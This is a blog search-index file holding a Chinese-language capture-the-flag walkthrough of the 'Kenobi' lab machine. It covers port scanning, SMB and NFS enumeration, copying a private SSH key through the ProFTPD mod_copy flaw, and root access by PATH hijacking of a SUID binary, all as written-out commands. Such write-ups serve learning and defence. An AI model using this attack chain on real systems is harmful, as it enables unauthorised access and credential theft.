<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>a</title>
      <link href="/2023/09/20/a/"/>
      <url>/2023/09/20/a/</url>
      
        <content type="html"><![CDATA[<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>对目标进行端口扫描</p><pre class="line-numbers language-none"><code class="language-none">sudo nmap --min-rate&#x3D;10000 -p- 10.10.96.173<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="Blog\source_posts\a\1.png" alt="1"></p><p>对目标进行TCP连接扫描并探测端口服务版本以及操作系统信息</p><pre class="line-numbers language-none"><code class="language-none">sudo nmap -sT -sV -O -p21,22,80,111,139,445,2049 10.10.96.173<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="Blog\source_posts\a\2.png" alt="2"></p><h2 id="2-SMB枚举"><a href="#2-SMB枚举" class="headerlink" title="2.SMB枚举"></a>2.SMB枚举</h2><p>SMB(Server Message Block)是一种在局域网内共享文件和打印机的网络协议,主要用于Windows系统之间的数据交换,但也可以实现在不同系统间共享文件和资源</p><p>通常来讲 SMB有两个端口：445 和 139 为TCP端口 同时也存在着UDP端口：137和138用于NetBIOS名称服务(NBNS)的UDP端口，用于SMB主机发现和名称解析 甚至一些系统会使用UDP代替TCP的445为SMB提供服务</p><p>我们使用nmap来枚举SMB共享</p><pre class="line-numbers language-none"><code class="language-none">nmap -p 445 --script&#x3D;smb-enum-shares.nse,smb-enum-users.nse 10.10.96.173<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="Blog\source_posts\a\3.png" alt="3"></p><p>可以看到我们枚举到了3个SMB共享</p><ul><li>IPC$: IPC服务,匿名可读写</li><li>anonymous: 匿名可读写</li><li>print$: 打印机驱动,所有用户无访问权限</li></ul><p>接着我们使用smbclient工具来访问名为anonymous的共享文件夹 </p><pre class="line-numbers language-none"><code class="language-none">smbclient &#x2F;&#x2F;10.10.96.173&#x2F;anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="Blog\source_posts\a\4.png" alt="4"></p><p>匿名共享也可以使用以下命令递归下载</p><pre class="line-numbers language-none"><code class="language-none">smbget -R smb:&#x2F;&#x2F;10.10.96.173&#x2F;anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以在此文件中看到为用户生成 SSH 密钥时 Kenobi 的信息以及有关 ProFTPD 服务器的信息</p><p><img src="Blog\source_posts\a\5.png" alt="5"></p><p>可以知道FTP在21端口上运行</p><p>于此同时在信息收集阶段 我们可以看到111端口在运行服务 rpcbind</p><h5 id="什么是rpcblind："><a href="#什么是rpcblind：" class="headerlink" title="什么是rpcblind："></a>什么是rpcblind：</h5><p>rpcbind是Linux系统中一个提供RPC服务的程序</p><p>主要功能有 监听RPC服务请求 分配端口号 将RPC程序号映射到TCP&#x2F;IP端口号 维护和管理RPC服务的注册信息</p><p>知识点：</p><ul><li>rpcbind通常监听111端口,使用TCP和UDP协议</li><li>攻击者可以通过rpcbind获取目标系统的信息</li><li>如果某RPC服务出现漏洞,攻击者可以通过rpcbind来攻击</li><li>常见的RPC服务包括NFS、DHCP等</li><li>rpcbind有版本漏洞可导致远程代码执行</li><li>防火墙需要监控rpcbind连接以防攻击</li></ul><p>在本靶机中，我们可以使用nmp来枚举这一点</p><pre class="line-numbers language-none"><code class="language-none">nmap -p 111 --script&#x3D;nfs-ls,nfs-statfs,nfs-showmount 10.10.96.173<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="Blog\source_posts\a\6.png" alt="6"></p><h2 id="3-获取基本权限"><a href="#3-获取基本权限" class="headerlink" title="3.获取基本权限"></a>3.获取基本权限</h2><p>在上述阶段中 我们得知ProFTPD 1.3.5在端口21上运行 同样的是我们也可以通过以下命令来确定</p><pre class="line-numbers language-none"><code class="language-none">nc 10.10.96.173 21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="Blog\source_posts\a\7.png" alt="7"></p><p>我们来寻找一下它存在的漏洞</p><pre class="line-numbers language-none"><code class="language-none">searchsploit proftpd 1.3.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Searchsploit 是一个用于 exploit-db.com 的命令行工具，我们可以用来查找特定软件版本的漏洞</p><p><img src="Blog\source_posts\a\8.png" alt="8"></p><p>输出显示了 ProFTPD mod_copy模块的漏洞利用。该模块将允许我们使用它的 SITE CPFR 和 SITE CPTO 命令将文件&#x2F;目录从服务器上的一个位置复制到另一个位置。任何未经身份验证的客户端都可以利用这些命令将文件从文件系统的任何部分复制到选定的目标。</p><p>在前面我们知道 FTP 服务以 Kenobi 用户身份运行，并为该用户生成一个 ssh 密钥。</p><p>我们现在将使用 SITE CPFR 和 SITE CPTO 命令复制 Kenobi 的私钥。</p><pre class="line-numbers language-none"><code class="language-none">SITE CPFR &#x2F;home&#x2F;kenobi&#x2F;.ssh&#x2F;id_rsaSITE CPTO &#x2F;var&#x2F;tmp&#x2F;id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来我们进行NFS网络文件系统的挂载操作：</p><pre class="line-numbers language-none"><code class="language-none">mkdir &#x2F;mnt&#x2F;kenobiNFS  &#x2F;&#x2F;生成空的挂载点目录mount 10.10.96.173:&#x2F;var &#x2F;mnt&#x2F;kenobiNFS   &#x2F;&#x2F;把远程&#x2F;var共享目录挂载到本地目录mount 10.10.96.173：&#x2F;var &#x2F;mnt&#x2F;kenobiNFS   &#x2F;&#x2F;执行两次 确保挂载成功ls -la &#x2F;mnt&#x2F;kenobiNFS     &#x2F;&#x2F;查看挂载的远程共享目录 验证是否挂载成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="Blog\source_posts\a\9.png" alt="9"></p><p>接下来获得登录的私钥</p><pre class="line-numbers language-none"><code class="language-none">cp &#x2F;mnt&#x2F;kenobiNFS&#x2F;tmp&#x2F;id_rsa . &#x2F;&#x2F;从远程复制文件到当前本地目录sudo chmod 600 id_rsa   &#x2F;&#x2F;更改权限为只有当前用户可读写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>并通过ssh连接登录 并获取到我们的第一个flag</p><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa kenobi@10.10.96.173 &#x2F;&#x2F;-i 指定文件作为本次ssh连接的私钥<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="Blog\source_posts\a\10.png" alt="10"></p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>这里我们使用PATH变量操作来提权</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="Blog\source_posts\a\11.png" alt="11"></p><p>可以看出menu很不寻常</p><p>我们执行一下</p><p><img src="Blog\source_posts\a\12.png" alt="12"></p><p>由于此文件以根用户权限运行，我们可以操纵我们的路径获得根 shell</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;tmpecho &#x2F;bin&#x2F;sh &gt; curlchmod 777 curlexport PATH&#x3D;&#x2F;tmp:$PATH  &#x2F;&#x2F;修改PATH变量,在原PATH变量前面添加&#x2F;tmp目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当执行curl命令时,由于&#x2F;tmp目录在PATH中最优先,系统会先在&#x2F;tmp目录下查找curl命令,找到我们创建的curl文件,该文件内容其实是&#x2F;bin&#x2F;sh,所以会执行系统的&#x2F;bin&#x2F;sh程序。实现了将curl命令劫持到系统shell &#x2F;bin&#x2F;sh。</p><p><img src="Blog\source_posts\a\13.png" alt="13"></p><p>获取到我们的flag</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
